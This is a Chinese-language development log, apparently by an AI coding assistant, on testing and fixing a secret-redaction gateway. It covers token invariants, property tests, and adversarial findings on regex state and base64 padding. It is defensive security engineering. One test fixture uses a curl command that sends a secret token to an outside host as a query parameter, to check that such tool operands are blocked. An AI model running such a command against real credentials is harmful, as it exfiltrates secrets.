- 必须声明结果取决于 **output channel** 与 **trust policy**，且三种结果都点名
- **不得出现 blanket 承诺**（正则否定：`tool calls?…are restored`、`all (placeholders|tokens)…restored` 等）
- 必须写明"不要假设 tool arguments 能解析 token"
- 必须声明注入范围；且正文无内嵌换行

### ② §6.5 与生产实现冲突

文档写"`entity-id` 每实体随机生成，**禁止自增计数**"；实现是 `this.nextToken += 1`。**文档错，而且指错了安全属性**：

```
request-id = 每请求 CSPRNG          ← cross-request unlinkability 的唯一来源
entity-id  = 请求内单调分配计数器    ← 只需请求内唯一 + 让同明文复用成为廉价查表
两者都不得由明文派生                  ← 不得有 checksum / hash / oracle
```

手工验证：四个不同明文（`0000`/`1234`/`9999`/AWS key）在同一请求位置各得一个全新 context，**都拿到 `_0001`**，与明文完全无关。

不变量测试（`test/token-syntax.test.js` 的 `R0.2.1` 组）：request-id 跨请求互异且同明文得到不同 token；entity-id 按分配序递增且同请求内复用；首位置与明文无关；token 形状无第三个分量可容纳 checksum；`TOKEN_LENGTH` 由宽度派生。

### ③ R0.1.2 limitation 方向说反

原表述"envelope 偏短只会导致替换得更多（span 变宽），永不泄漏"——**只在相对 detector span 时成立**；相对真正的 reference construct 它是 **UNDER-COVER**。已改为相对两个参照物分别说明，并明确当前后果：**已检测到的 secret 字节仍会消失（无已知 confidentiality fail-open），但 quoted-brace 情形的 syntax integrity 不做保证。**

## 9.26 R0.3 Production Context Wiring（已实现）

两个**程序化生产输入**在底层被支持、但从未到达请求侧 `RedactionContext`。两处都很容易被漏掉，因为**每个特性看起来都已接线**：

| 输入 | 症状 |
|---|---|
| `foreignRegistry` | **响应**路径拿到了它，所以 G0.1 的 response E2E 全绿；而**去程**仍把一个本应保留的 foreign token 重新铸号 |
| `profile` | `RedactionContext` 支持它，但 `handleRequest` 从不传，因此部署方**无法**通过生产入口选择 profile |

修正：`handleRequest` 的 ctx 构造现在传 `foreignRegistry` 与 `profile: options.profile`。

### 端到端实测（全部穿 `handleRequest`）

```
foreign + registry（去程保留）    DB_PASSWORD=ACME_ABCDEF_0001 → 原样
foreign 无 registry（普通策略）    → DB_PASSWORD=CRG_...
EC2 id + DEFAULT（脱敏）          → instance: CRG_...
EC2 id + DEVOPS（保留）           → instance: i-0a1b2c3d4e5f67890
hard cred + DEVOPS（仍脱敏）      → DB_PASSWORD=CRG_...
registry + DEVOPS（两者独立）      → 均按各自规则
```

### 为什么此前没被发现

**这两个缺口都只在 `RedactionContext` 单测下不可见**——单元是对的，接线不是。与此前 G0（`classifyRestore` 零调用点）和 G0.1（registry 只在响应路径）是**同一个失败模式**：

> helper 正确、生产没接线；而测试只测 helper。

因此本刀的 9 条测试**全部穿 `handleRequest()`**，其中一条专门断言 `handleRequest` 确实把两个参数传给了 ctx。

### 一处夹具教训（第三次同源）

写"未传 profile 时用默认值"时，我断言 `implicit === explicit`——**跨请求 token 必然不同**（request-id 每请求随机，正是 R0.2.1 刚固定的不变量）。已改为比较**结果形状**而非字节。

### 未做（刻意）

没有为 profile 发明环境变量名。`REDACT_INFRA_PROFILE=devops` 之类属于**部署配置 hardening**，本刀只保证**程序化生产路径真实可用**。测试中有一条断言 `worker.js` 里没有出现 `env?.` 形式的 PROFILE / INFRA 变量。

## 9.27 R1 Security Invariant Property Tests（已实现）

**R1 与 R2 严格分开**：

```
R1 = 已知安全性质 + deterministic generator（本刀）
R2 = adversarial / random exploration（探索本身是目的）
```

### harness 规则（`test/helpers/property.mjs`）

- **固定 seed**（`DEFAULT_SEED = 0x5eed1234`），`mulberry32` 确定性 PRNG
- **不使用 wall clock / crypto randomness / Math.random** —— 同一 seed 在任何机器、任何时间产生同一序列
- **失败打印 seed（十进制+十六进制）、case 序号、精确输入，并对字符串输入给出最小复现**
- 每条性质 120~250 组；**不追求随机撞 bug，追求性质永远成立**

失败报告实测：

```
[probe] property failed
  seed:  3735928559 (0xdeadbeef)
  case:  42 of 100
  input: "key7=value4"
  minimal: "k"
  error: deliberate failure on key7=value4
```

### 已固定的性质（`test/r1-security-invariants.property.test.js`）

| 性质 | 组数 |
|---|---|
| 被 span **覆盖**的凭据不得明文存活 | 250 |
| redact→restore 逐字节一致 | 250 |
| 已脱敏的普通文档幂等 | 250 |
| token 形状的输入**永不获得豁免** | 250 |
| 未被拥有的 token 永不被替换 | 250 |
| 硬凭据在**任何 profile** 下都被脱敏 | 250 |
| 已验证 infra 标识跟随 profile（而非检测器） | 120 |
| 替换后不残留半开宿主语法 | 150 |
| 发出的 token 形状良好且自识别 | 250 |
| 输出中不存在截断的 `CRG_` 前缀 | 250 |
| 已登记 foreign token 被保留、永不解析 | 120 |
| **generator 自身产出所需形态**（防空转） | 250 |

最后一条是**防止整套性质空转**的守卫：性质套件若 generator 不再产出有趣输入，会永远通过却什么都没测。

### 写这套性质时暴露的 5 处**我的断言错误**（全部先验证再改，无一是实现问题）

1. `AKIAIOSFODNN7EXAMPLE` 是 **gitleaks 规则显式 allowlist 的占位符**（`allowRegexes:[/.+EXAMPLE$/]`）——规则正确工作时不报。用它当"必须被检出"的夹具，失败信息与网关无关。
2. "claimed" 不能由**键强**推断，必须是 **span 覆盖**。强键 + 检测器不接受的值（`Pr0d-P@ssw0rd-Xy9Zk2mQ`）**本就不该被脱敏**。
3. 不能在整个输出里搜被覆盖文本：generator 会把同一明文放在两行，而弱键那处**有意不 claim**（低熵解析无法区分）。
4. `${` 与 `{{` 在 `${{` 中**重叠**，朴素 `split("${")` 计数会误报不平衡。
5. token 语法是 `[A-Z0-9]{4,}`（两段都是），`{6}`/`{4}` 只是**当前分配器**的宽度，不是语法。

### R1.1 更正：surrogate 重新包装的归因

R1 初稿把"base64 surrogate 在第二轮被重新包装"记为 FINDING，**归因写错了**，而且两条 property 的**标准不一致**：

```
plain-token 幂等测试：先 normalize 掉不同 request 的 token 再比较
surrogate 测试：      直接比较 raw base64
```

### 跨 request 重新包装是**契约**，不是缺陷

```
ownership request-local
shape != ownership
cross-request token unlinkable
```

新 context 铸新 request-id，若让上一 request 的 surrogate 解析成功，就**破坏了跨请求不可关联性**。这一条现在是显式契约测试（`cross-context re-wrapping is the CONTRACT`）。

### 真正的缺陷：same-context 的 representation-aware ownership 未收口

```
ctx1 → surrogate(request1 token)
ctx1.redactText(output again) → 又包一层   ← 缺陷
```

根因是两层不一致：

```js
classifyOwnership(surrogate, ctx)  → 经 ledger resolveSurrogate()  → OWN    ✅
ctx.isProtectedToken(surrogate)    → 只查 tokenToRaw.has(value)    → false  ❌
```

即 **representation-aware ownership 在 restore/policy 层成立，在 input protection 层没收回**。

修正：`isProtectedToken` 先做 `resolveSurrogate(value, this)`，与 `classifyOwnership` 对齐，且后续 foreign 判定也基于解析后的 token。

**安全性**：`resolveSurrogate` 只查 ledger 的**精确映射**，所以这不是"按 base64 形状自动认 surrogate"——那会重新制造 shape-based bypass。任何人可以 base64 编码一个 token 形状的串，但只有本 request 真正铸过的才在 ledger 里。

### 幂等性质改为在同一 context 内断言

现在 plain-token 与 surrogate 两条 property **用同一标准**：同一个 context、逐字节相等。此前 normalize 后比较，测的其实是"没有新的脱敏"而不是幂等。surrogate 文档已**纳入**该性质而非排除。

### 最低回归（全部实测）

| 场景 | 结果 |
|---|---|
| same context：明文 K8s `Secret.data` → surrogate S → 再脱敏输出 | **exact same S** |
| `classifyOwnership(S, ctx)` | `OWN` |
| `ctx.isProtectedToken(S)` | `true` |
| 任意 `base64(CRG_AAAA_AAAA)` 但不在 ledger | `UNKNOWN`，强绑定下仍正常脱敏 |
| new context：ctx1 的 surrogate 输入 ctx2 | **不继承** ownership，可重新脱敏 |
| 跨 request 两个往返 | 都正确（pass 2 回到 pass 1 输出） |

## 9.28 R1.2 Invariant Matrix Closure（已实现）

R1 的验收项里有 5 条**没有自己的 property**。本刀只加测试，**不改生产行为**。

### P3 — OWN token × sink × trust 授权矩阵

现有 `unowned token never substituted` 覆盖不到 OWN token 一侧。固定的矩阵：

```
OWN + assistant_text + untrusted        → 可还原
OWN + tool_argument  + untrusted        → 保留 token，明文不得出现
OWN + shell/network/database/email      → 明文不得出现
OWN + explicit trusted broker           → 可还原
```

**property 直接写在输出上**：`output contains plaintext ⇒ sink has restore authority`。不检查 mode/action 字符串——那正是"helper 正确、生产没接线"会通过的形式。

### P5 — plain token 与 surrogate 的**交付策略**等价

R1.1 已证明两者 **ownership** 一致，但没证明**policy** 一致。同一 entity 的两种表示跑同一 sink 矩阵，要求：`assistant restore ↔ restore`、`tool preserve ↔ preserve`、敏感 sink 两侧都无明文、**拒绝判定也一致**。

### P6 — parser failure ≠ detector shutdown

生成 parser 无法完整理解的宿主文本（未闭合引号、`[ broken`、`${{ malformed`、`{a:`、`- ?`、混合缩进块）。**先做 fixture sanity**：证明该赋值确实**没有**被解析成 binding；再证明独立 provider detector 仍然命中并移除 secret。

### P7 — AMBIGUOUS 不能获得豁免

补齐最关键的中间格：

```
VERIFIED  + preserve profile → may preserve
AMBIGUOUS + preserve profile → redact        ← 此前无覆盖
HARD      + VERIFIED         → redact
```

用 `decideSpanAction()` 做笛卡尔矩阵（policy 问题，E2E 只能抽样），另有一条 E2E 观察同一格，防止矩阵与管线脱节。

### P8 — 选中 span 之外的字节不变

最强可用形式：**用 `findSensitiveSpans()` 报告的 span 从输入重建输出**，若任何其他字节移动（吞注释、吞引号、offset 漂移、`i-CRG...`、半截模板），重建就不可能匹配。另有一条直接读边界：span 不得以引号/逗号/空白/注释符开头或结尾。

外围随机取自 quotes / spaces / `#` comments / commas / `=` / `:` / newline。

### 非空转验证（实测）

property 的 `assert.ok(exercised > N)` 只在**失败时**可见，所以另行打印了执行数：

```
P3  执行 200，其中实际还原 66
P6  执行 180 / 180 被 claim
P8  执行 240 / 240 有 span
P8b 执行 180 / 180 有 span
```

### 本轮暴露的我的断言错误（第 6 次同源）

P7 里我断言"DEFAULT profile 会脱敏每个 VERIFIED 值"——**是错的**：`DEFAULT_PROFILE` 本身就 preserve `GIT_SHA` 与 `OCI_DIGEST`。改为**从 profile 对象读取期望值**而非硬编码：

```js
const expected = profile[infra.infraType] === INFRA_DISPOSITION.PRESERVE ? "preserve" : "redact";
```

硬编码矩阵会让测试变成 policy 的**第二份会漂移的副本**，而不是对 policy 的检查。

## 9.29 R2 Adversarial Exploration（进行中）

### R1 与 R2 的边界

```
R1 = 已知 property → 证明它始终成立
R2 = 不预设具体 bug → 主动寻找 property / parser / representation 之间的组合裂缝
```

R2 允许三类搜索：**mutation**（局部变异）、**combinatorial composition**（两个各自合法的机制组合）、**metamorphic / differential**（改变"不该影响安全语义"的表示，看结果是否不合理变化）。

**暂不做**（留给 R3）：大体积性能压测、ReDoS 时间阈值、MB 级 corpus、长时间随机跑。

### Finding 门槛（四条同时满足）

```
A 可重复       固定 seed / 输入 / 配置下 100% 重现
B 可最小化     能给出 minimal reproducer
C 可归因       能指出违反了哪条 contract / invariant
D 有实际后果   confidentiality / integrity / availability /
               ownership-policy inconsistency / protocol corruption / deployment correctness
```

只有"输出和我想象的不一样" ⇒ **observation，不是 finding**。

**流程固定**：discover → minimize → prove violated contract → add isolated RED regression → classify severity/root cause → 再决定是否修。**看到红测不马上改生产代码。**

**找到第一个可靠 finding 即停止该类别 fuzz**，不一口气找 17 个红点一起改——因为很可能是 1 个 root cause，而这正是本 session 反复出现错误归因的根源。

### corpus 形式

```
test/adversarial/
  registry.test.js          已建
  streaming.test.js         R2.2
  parser-collision.test.js  R2.3
  span-collision.test.js    R2.4
  representation.test.js    R2.5
  operand.test.js           R2.6
test/adversarial/corpus/
  findings.json             只有最小化后的 finding
```

每类有 derived seed（`REGISTRY 0x2e610001` …），每类 500~2000 case。**R2 的价值来自定向组合，不来自随机次数。**

## 9.29.1 R2-REG-001（open，未修）

**一条 finding：stateful matcher 让 ownership 判定交替。**

**最小复现**（只有一个 registry、一个 matcher、一个 token）：

```js
const pattern = /ACME_[A-Z0-9_]+/g;
const r = new ForeignTokenRegistry([{ name: "acme", pattern }]);
r.namespaceOf("ACME_ABCDEF_0001")  // acme, null, acme, null, ...
```

根因：`RegExp.prototype.test` 在 `g`/`y` 匹配器上会推进 `lastIndex`，而 `normalizeForeignNamespace` **原样保留传入的 RegExp**（不剥 flag），`namespaceOf` 也不复位。更关键的是**两层互相干扰**：

```
classifyOwnership  匹配前复位 lastIndex
isProtectedToken   不复位
```

于是同一个 registration 的判定**取决于调用顺序**：

```
#0  classifyOwnership=FOREIGN_REGISTERED  isProtectedToken=false
#1  classifyOwnership=UNKNOWN             isProtectedToken=true
```

**实际后果**：输入方向上 `DB_PASSWORD=ACME_ABCDEF_0001` 被**脱敏**而不是保留：

```
non-global matcher → spans=[]          → kept      ✅
/g 或 /y matcher   → spans=[binding]   → redacted  ❌
```

**影响分类**：ownership/policy inconsistency + deployment correctness。**无 confidentiality 泄漏**（失败方向是过度脱敏）。**exact registration 不受影响**（`namespaceOf` 先查 `tokens` 直接返回）。

**控制组**：等价的无状态匹配器 `/ACME_[A-Z0-9_]+/` 正确保留 token ⇒ 缺陷在**匹配器的使用方式**，不在 registry 的设计目的。

### 本轮记录的 observation（**不是** finding）

1. **repeated occurrence 的 index 恒指向第一处**：`text.indexOf(f)` 对重复值返回首位（`[0,11,0]` vs 真实 `[0,11,22]`）。当前该 index 只用于**存在性判定**（`foreign.includes(found)`），位置未被消费，故无后果。若将来有人用它定位内容，这条会变成真缺陷。
2. **capture group matcher 按 full match 求值**（`.test()` 忽略分组）。正确，记录以免读者误以为用 group。
3. **exact registration 完全绕过 matcher**，因此免疫该状态问题——这条界定了影响范围。

## 9.29.2 R2-REG-001 已修复（fixed）

**判定**：confidentiality 未发现 fail-open；**ownership consistency violated**；**deployment correctness violated**；severity = **Medium / release-blocking correctness**。不接受为 known limitation——namespace registration 是显式 trust/config contract，同一 token 连续调用不能因历史调用顺序在 `FOREIGN_REGISTERED` / `UNKNOWN` 之间摆动。

### 修复（两层，按建议实施）

**1. registry 自己持有 RegExp clone**

```js
if (pattern instanceof RegExp) return new RegExp(pattern.source, pattern.flags);
```

外部修改 `pattern.lastIndex` 不影响 registry，registry 也不污染调用方 regex。

**2. 唯一 helper，membership 每次从 0 开始并恢复干净状态**

```js
function namespaceMatches(matcher, value) {
  matcher.lastIndex = 0;
  try { return matcher.test(value); } finally { matcher.lastIndex = 0; }
}
```

**没有采用"保存旧 lastIndex → 最后恢复旧值"**：registry 内部 matcher 本就不该携带可观察 cursor state，调用结束后固定回 0 才是诚实状态。

`namespaceOf` 与 `classifyOwnership` 都改用该 helper；另外三处用 `String.match` **枚举** foreign token 的站点改用 `namespaceFindAll`（`String.match` 对 g/y 同样读写 `lastIndex`，四处原本各自手写 `lastIndex = 0` 且无 finally）。修复后 `worker.js` 中不存在裸的 `ns.matcher.test` / `text.match(ns.matcher)`。

**不剥 `g`/`y`**：匹配器的语言保持原样，只是不再有 cursor state。

### 回归（15 条，全部固定契约而非旧缺陷）

`same token × 100 calls 恒定`、`classifyOwnership × isProtectedToken 永远一致`、`去程保留 + 不产生 span`、**顺序不变量**（`A,B,A,B,A` 与 `A,A,A,B,B` 对每个 token 结果一致）、**caller regex 双向隔离**（构造与匹配都不读写调用方 `lastIndex`，且调用方仍能用自己的 regex 迭代）、`共享 registry 跨请求稳定`、`exact registration 不受影响`、`所有 matcher 形态（plain/g/y/gi/gy）稳定`、`string pattern 不变`。

`y` 保留 sticky 语义（只匹配 offset 0），这是调用方声明的含义——已用测试固定。

## 9.29.3 R2-REG-002 已修复（fixed）

**判定**：Severity Low，但属 **release-blocking correctness**——它破坏的是**既定 tool-sink contract**，而不是未承诺的特性。

### 缺陷

sticky matcher **无法在文档中间找到 token**：

```
namespaceOf("ACME_ABCDEF_0001")           = acme   （offset 0 命中）
namespaceOf("curl x?y=ACME_ABCDEF_0001")  = null   （有前缀即找不到）
→ untrusted tool operand 被交付而不是 BLOCK
```

用 `git stash` 验证过修复前后行为一致 ⇒ 既有缺陷，与 R2-REG-001 无关。

### 修复：`namespaceFindAll` 是**文档搜索**，不是 membership predicate

**`namespaceOf` 完全不动**——它问的是"**整个字符串**是否属于该 namespace"，所以保留 matcher 声明的语义，包括 sticky 的"只在 offset 0"。

扫描问的是"该 namespace 在文档的什么位置出现"，sticky/有状态 matcher 会答错。因此：

```js
search clone   → 去掉 y、确保 g        （可在任意 offset 找 candidate）
original       → 完全不动              （membership 仍保留 sticky 语义）
找到后          → 重新 namespaceMatches(original, value)
```

**discovery ≠ authority**：clone 只提出候选，原 matcher 决定。这既让 sticky 对"整串成员性"仍然有意义，又不让它蒙住扫描，而且 **registry 自己的 matcher 永不被人为改写**。

### 两个方向都固定

```
namespaceOf(TOKEN)          = acme    ← 不变
namespaceOf(prefix + TOKEN) = null    ← 不变（sticky 语义保留）
operand ("curl x?y=" + TOKEN)          → BLOCKED  ✅ 已收口
prose                                  → 保留      ✅ 两通道现在一致
registry matcher flags                 → 仍含 y    ✅ 未被永久改写
```

### 回归（含一条我写错后修正的表）

`每一组 flag 组合`都要求：offset 0 成员性成立、**文档中间能被扫到**、且 prefixed 整串的成员性遵循**声明语义**。

我最初把期望表写成"`gi` 也是锚定的"——**错**：只有 sticky 才是锚定的，`gi` 无锚定、本就能匹配中间位置。已修正为 `y` / `gy` 锚定，其余不锚定。

另一条「admission 不被放宽」最初断言在 **span** 上，但 span 也可能由 strong binding 产生，测试会因错误原因通过。改为直接断言**权威判定**（`classifyOwnership` → `UNKNOWN`、`isProtectedToken` → false），并附**大小写对照**（精确大小写被准入），确保拒绝的原因是大小写而非 registry 失效。

## 9.30 R2.2 Streaming / SSE Fragmentation（已实现，**无新 finding**）

### 两个 oracle，严格分开

**A. Transport fragmentation** —— SSE **字节完全相同**，只改变 HTTP chunk 边界：

```
gateway(fragmented bytes) === gateway(unsplit bytes)   逐字节
```

**B. Logical delta fragmentation** —— 同一逻辑文本由**不同数量**的 SSE 事件承载。**raw 相等在这里是错的**：`SseRestorer` 合并 channel 后把 restored 内容放在该 run 的**第一条 record**，后续 delta 合法地变成空串，事件数量与 JSON 表示可以不同。

```
canonical(fragmented logical events) === canonical(single logical event)
```

另**单独**验证：每个 event 仍可解析、顺序不变、元数据不丢、sink policy 不变。

混用两者是这套测试要防的错误：**用 raw 相等测 B 会在正确行为上失败，用 canonical 测 A 会掩盖真实的字节变化。**

### 覆盖

`test/adversarial/streaming.test.js` + `streaming-helpers.mjs`

**A（5 条）**：每一个切分点（穷举）、逐字节 chunk、随机 2~8 段、**UTF-8 多字节序列在 chunk 边界被切开**、五种 sink channel（`output_text` / `function_call_arguments` / `mcp_call_arguments` / `custom_tool_call_input` / 未知事件）。

**B（7 条）**：canonicalizer 自身守卫（并**演示两个 oracle 确实不同**）、surrogate 跨事件分片、元数据与顺序保持、sink policy 不变、未知事件不因分片获得 RESTORE 权限、无关 base64 不被 hold 或改写、seeded 探索 120 例。

### 结论

**transport 层逐字节等价**（穷举所有切分点验证）；**logical 层 canonical 等价**；两者均未发现缺陷。

### 本轮修正的四处**测试方法**错误（无一是实现缺陷）

1. **跨请求比较 token**：我先跑基线、再用**基线 token** 构造另一个请求，差异来自随机 request-id 而非分片。改为**每次 trip 用自己铸出的 token 构造事件、比较前归一化 token**（token 跨请求唯一性由 R0.2.1 的独立不变量测试保证，不在此重复断言）。
2. **canonicalizer 把元数据也拼接**：`type` 是事件类型、每个事件都出现，按内容拼接会重复计数，使**正确合并的结果与单事件不等**——一个假 oracle。改为区分 **content field**（`delta` / `text` / `partial_json` / `arguments` / `input` / `content` / `output_text`，累积）与 **metadata**（其余，单独校验保持性）。
3. **在 raw 输出里搜值**：分片会合法地把一个值分配到**两个 delta 字段**，原文不再连续。改为在**重组后的 canonical content** 里搜索。
4. **分发载荷时漏掉前缀**：whole 用 `curl x?y=<token>`、split 只用 `<token>` 两段——**两侧根本不是同一逻辑内容**。另有一条 fixture 断言了 `minted`，但 surrogate 字段下 upstream 根本看不到 CRG token，该断言不适用。

第 4 条尤其值得记：我当时一度怀疑是 **gateway 丢前缀**。用 `restoreSseStream` 隔离后证明 SSE 层**保留前缀**、合并完全正确，问题在我的 harness。

## 9.31 R2.3 Parser Collision / Grammar Ambiguity（已实现，**无新 finding**）

### 核心问题不是"哪个 parser 正确"

多个 parser 合理地读同一段字节、得到不同边界：YAML 看到 `password: |` 与块体、shell parser 看到 `KEY=value`、URL parser 看到 `?q=...`、header parser 看到 `Authorization: Bearer ...`、reference scanner 看到 `{{ ... }}`、provider detector 则在任何位置看到凭据。

**oracle 不要求某一方胜出**，只要求**组合**仍守四条契约：

```
1. hard secret 不泄漏
2. mutation boundary 外字节不移动
3. parser 失败不得禁用独立 detector
4. 同一输入重复执行结果稳定（形状）
```

满足四条的组合**就不是缺陷**，无论边界多么反直觉。

### 覆盖

`test/adversarial/parser-collision.test.js`

- **20 个碰撞模板 × 3 个 secret**（`op://` / `http://` / `image:tag` / `key=${REF}` / `key=$(ref)` / `Bearer` / 未闭合引号 / 块标量 / 序列项 / 流式映射 / 多文档 `---` …）
- **21 个歧义宿主片段 × 3 个 secret × 4 种摆放**（>200 例）
- **seeded 组合 400 例**
- 定向：URL query 逐字节保留、未解析行中的 secret 仍被 claim、引号不被吞、**同行两个不同 secret 都被脱敏**、同明文复用同一 token、**任何 span 都不得跨行**、collision corpus 可复现

### 结论

**无新 finding。** 四条契约在全部组合下成立。

### 本轮修正的两处**测试**错误（第 4、第 7 条）

**① 契约 4 断言成了字节稳定。** 重复执行时 token 必然不同（request-id 每请求随机，其唯一性有自己的不变量测试）。改为断言**形状**：`normalize(out)` 后比较——即"哪个位置出现 token、周围字节是什么"稳定。这与 R2.2 同一类错误。

**② 我误判了一次"注释被吞"。** 定位到只有 **YAML 路径 + `#` 前无空白** 时 `# note` 被纳入 span：

```
password: <PAT># note   → span 含 "# note"   ❌ 我当时判定为缺陷
password: <PAT> # note  → span 只含凭据      ✅
DB_PASSWORD=<PAT># note → span 只含凭据      ✅
```

**用 PyYAML 6.0.1 校准后推翻了我的判断**：

```
password: abc# note   → {'password': 'abc# note'}    # 属于纯量值
password: abc # note  → {'password': 'abc'}          # 才是注释
```

YAML 规范要求 `#` 前必须有**空白**才起注释。所以紧跟在凭据后的 `#` **确实属于值**，claim 整段是**正确**的——**gateway 与 PyYAML 一致**。若按我最初的断言"修"，反而会让实现偏离语法。

已改为 OBSERVATION 并附带对照（有空白时注释保留）。

> 这是本 session **第 5 次**"我把未验证的推断当成结论"。前四次：AWS `[A-Z2-7]`、`op://` 的 INTERNAL_HOSTNAME 归因、R0.2 的"无漂移"结论、P7 的 DEFAULT profile 期望。规律一致：**推断一旦写进测试或文档就会变成后续推理的前提**。这次的正确做法是**先用 PyYAML 取基准再判定**。

## 9.32 R2.4 Span / Envelope / Merge Collision（已实现，**无新 finding**）

### 第一优先级：envelope convergence（定向，非随机 overlap）

危险不是"两个 span 重叠"，而是**两个原本互不重叠的 detector span 在 reference widening 后变成完全相同的 span**：

```
DB_PASSWORD=${{ <32 hex> <email> }}
                   ^soft     ^hard
```

widening 后两者都成为同一个 envelope，而 merge 只保留其中一个。**若 soft span 胜出且其自身判定为 preserve-eligible，其中的 hard 秘密就可能一起存活——一个纯粹由"增加一个 detector"导致的明文泄漏。**

### 差分 oracle（本刀的关键）

不是绝对断言，而是：

```
hard-only redacts X  ⟹  hard+soft 也必须 redacts X
```

**增加 detector 绝不能削弱保护。** 其余关于 merge 的一切（谁胜出、边界在哪）都允许反直觉。

### 实测

```
差分检查：2 profile × 3 hard × 3 soft × 2 顺序 × 7 wrapper = 252 组
          + seeded 300 组
违约：0
```

**结论：`hard-only 脱敏 ⇒ hard+soft 也脱敏` 全部成立。soft span 永远不会把 hard span 挤掉。**

### 定向覆盖

- **fixture sanity 先行**：先证明 hard-only 确实脱敏、且 widening 后**每个 span 都等于 envelope 边界**（这才是 convergence 的证明），再做差分断言
- 胜出 span 的判定生效：含 hard 内容的 span 决策记录必须为 `redact`，绝不 `preserve`
- **碰撞几何**：同明文两次、相邻秘密、重叠 envelope、嵌套 envelope、两个相同 envelope、秘密在 envelope 边缘、秘密跨闭合符、同 bounds 重复命中、hard 在 soft 形状字段内、soft 在 hard 字段内
- **attribution 不被 soft 覆盖**：`reason` 必须是 `hard-secret`、`detector` 必须是 `gitleaks`

### 本轮修正的两处**我的断言**错误

1. **断言了不存在的字段**：`policySummary()` 的行暴露 `reason`，**没有** `hardSecret` 布尔。改为断言 `reason: "hard-secret"` / `action: "redact"` / `detector: "gitleaks"`。行为一直是对的。
2. **前后矛盾的残留断言**：同一测试里先断言裸 40-hex 是 `AMBIGUOUS`，后面又断言它是 `VERIFIED`。改为分别断言裸形态 AMBIGUOUS、`commit ` 锚定形态 VERIFIED。

### 一个值得记的设计结论

**merge 产生"哪个 span 胜出"的差异不构成缺陷**——例如同样内容，hard-first 时 entropy span 覆盖 email（判定 redact，因为 `classifiedText` 是 32-hex 且 AMBIGUOUS 仍 redact），而 email-first 时 email span 胜出（hard）。

两者都**安全**，因为：
1. `decideSpanAction` 跑在胜出 span 的 `classifiedText` 上；
2. AMBIGUOUS infra **在任何 profile 下都 redact**（P7 已固定）。

**差分 oracle 正是为这种情形设计的正确工具**：它不关心内部哪个 span 胜出，只问"增加 detector 后 hard 内容是否仍被移除"。

> **措辞更正**：不要写成"`classifiedText` 消除了顺序敏感性"——这超出了实测强度。准确表述是：**internal survivor may be order-sensitive; security outcome was order-invariant in the exercised corpus.**（内部胜出者可能对顺序敏感；安全性结果在已遍历的 corpus 中与顺序无关。）

## 9.33 R2.5 Representation / Ownership / Ledger Adversarial（**1 finding**）

优先级按"跨层 authority + request-local state"排。

### ① SurrogateLedger exact authority —— 不变量成立

7 种表示 × 多种上下文实测：

```
real OWN token                  → OWN       protected
real ledger surrogate           → OWN       protected
forged CRG                      → UNKNOWN   not protected
base64(forged CRG)              → UNKNOWN   not protected
double-base64(real token)       → UNKNOWN   not protected
double-base64(forged)           → UNKNOWN   not protected
surrogate then base64           → UNKNOWN   not protected
```

**关键事实**：surrogate 方案就是 `base64(token)`，故 `b64(realToken) === realSurrogate`。这意味着 **"base64 一个 token" 与 "登记一个 surrogate" 是同一件事**，因此"未登记的 base64(real token)"不构成独立情形——它要么就是该 surrogate（命中 ledger），要么不是 token 的编码。**ledger 精确映射是唯一权威。**

**总 oracle 无违约**：`plaintext appears ⇒ exactly ownership AND sink restore authority`（6 上下文 × 2 表示 × 6 sink × 2 trust = 144 组）。

### ② EntityLedger first-write-wins

同一明文跨 occurrence / schema / path 时**复用同一 token identity**（5 种排列实测）。账本保持**首条记录**，故元数据字段（`syntax` / `pathSegments`）**对顺序敏感**——按你的要求**这不单独判为 finding**，只在它影响安全结果时升级。实测安全性结果与顺序无关（两序都脱敏、往返都精确）。

### ③ restoreText 两阶段级联 —— 未发生

构造 `tokenToRaw: {outer → inner(CRG-looking), inner → plaintext}`，验证 `restoreText(outer)` **单趟**返回 `inner`，不会继续解析成明文。**无级联。**

### R2-REP-001 已修复（fixed）

**一个真实 finding。** 在 K8s Secret 文档探索中发现。

**最小复现**：

```
A=cGFzc3dvcmQxMjM0NTY3OA==   →  A=CRG_AAAAAA_0001==     ❌ padding 残留
A=cGFzc3dvcmQxMjM0NTY3OA=    →  A=CRG_AAAAAA_0001=      ❌
A=cGFzc3dvcmQxMjM0NTY3OA     →  A=CRG_AAAAAA_0001       ✅
```

**K8s 路径**（同一明文的两个 occurrence 产生**两个不同 span**）：

```
data:
  a: cGFzc3dvcmQxMjM0NTY3OA==  →  Q1JHX0FBQUFBQV8wMDAx      （正确）
  b: cGFzc3dvcmQxMjM0NTY3OA==  →  Q1JHX0FBQUFBQV8wMDAy==    （截断编码 + 原 padding）
```

根因：**entropy span 停在 base64 padding 之前**，而 gitleaks span 包含 padding。两个 span **重叠但互不包含** ⇒ merge 全部保留 ⇒ 同一明文得到**两个不同替换件**，第二个是"token 的 base64 编码 + 原 padding"。

**违反的契约**：替换件必须**自定界**。R1 已固定"每个发出的 token 匹配 `^CRG_[A-Z0-9]{4,}_[A-Z0-9]{4,}$`"且"无截断前缀残留"——**但"完整替换件之后粘着残留字符"这另一半从未被覆盖**。`CRG_AAAAAA_0001==` 既不是 token、也不是合法 base64、也不是原值。

**影响**：integrity / representation correctness，**在 K8s 之外同样成立**（`A=...` 最小复现）。同一明文获得两个 identity。**无 confidentiality fail-open**；往返恰好仍正确（残留 `==` 仍是原值的 padding，且 restore 基于子串），已在测试中单独断言以保证结论精确。

**既有性**：`git stash` 验证修复前后行为一致 ⇒ 与 R2-REG-001/002 无关。

**R1 为何漏掉**：R1 的 token-shape 性质先移除所有完整 token、再检查无 `CRG_` **前缀**残留。**位于完整 token 之后**的残留对该检查不可见——该性质只覆盖了截断，没覆盖尾部残留。这是**性质表述不完整**，不是实现回归。

#### 根因（重新表述）

**"同一明文两个 identity"是后果，不是 ledger 缺陷。** 实际送入 mapping 的 raw 本就不同：

```
occurrence 1 raw = cGFzc3dvcmQxMjM0NTY3OA==
occurrence 2 raw = cGFzc3dvcmQxMjM0NTY3OA
```

`rawToToken` 按自己的 contract 正常分配了第二个 identity。真实链条：

```
entropy boundary truncation
  → original representation residue survives
    → 第二个 occurrence 的 raw 不同
      → mapping 合法地分配第二个 identity
```

**真正的缺陷是 `detector evidence boundary ≠ representation mutation boundary`**：detector 已证明核心值得保护，但没有任何环节把尾部 `=` 当作**编码标量的结构边界**。

#### 修复：base64 representation envelope

与 reference / infra envelope 同层同原则——**detector 决定 verdict，representation 决定 mutation boundary**。

`base64ScalarAt()` 仅在以下条件全满足时，把 evidence span 向右扩最多 padding 字节：

```
1. span 起点就是标量起点（前一字符不属于 base64 字母表）
